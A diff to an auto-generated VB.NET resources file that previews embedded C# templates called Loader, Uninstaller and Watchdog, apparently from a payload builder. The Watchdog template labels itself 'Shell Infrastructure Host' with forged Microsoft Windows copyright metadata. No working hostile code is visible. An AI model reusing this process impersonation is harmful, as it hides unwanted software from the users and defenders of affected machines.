@@ -90,6 +90,7 @@ Namespace My.Resources
         '''using System.Threading;
         '''using System.Diagnostics;
         '''using System.Runtime.InteropServices;
+        '''using System.Linq;
         '''#if DefDebug
         '''using System.Windows.Forms;
         '''#endif
@@ -99,7 +100,7 @@ Namespace My.Resources
         '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
         '''[assembly: AssemblyCompany(&quot;%Company%&quot;)]
         '''[assembly: AssemblyProduct(&quot;%Product%&quot;)]
-        '''[assembly: AssemblyCopyright(&quot;%Copyrig [rest of string was truncated]&quot;;.
+        '''[assembly: Assembl [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Loader() As String
             Get
@@ -195,7 +196,7 @@ Namespace My.Resources
         '''public partial class Uninstaller
         '''{
         '''    public static string lb = RGetString(&quot;#LIBSPATH&quot;);
-        '''    public static string bD = Environment.GetFolderPath(Environment. [rest of string was truncated]&quot;;.
+        '''    public static string bD = Environment.GetFolderPath(Environment.SpecialFolder.Appli [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Uninstaller() As String
             Get
@@ -219,7 +220,8 @@ Namespace My.Resources
         '''[assembly: AssemblyTitle(&quot;Shell Infrastructure Host&quot;)]
         '''[assembly: AssemblyDescription(&quot;Shell Infrastructure Host&quot;)]
         '''[assembly: AssemblyProduct(&quot;Microsoft® Windows® Operating System&quot;)]
-        '''[assembly: AssemblyCopyright(&quot;© Microsoft Corporation. All Rights Reserved.&quot;)] [rest of string was truncated]&quot;;.
+        '''[assembly: AssemblyCopyright(&quot;© Microsoft Corporation. All Rights Reserved.&quot;)]
+        '''[assembly: Ass [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Watchdog() As String
             Get
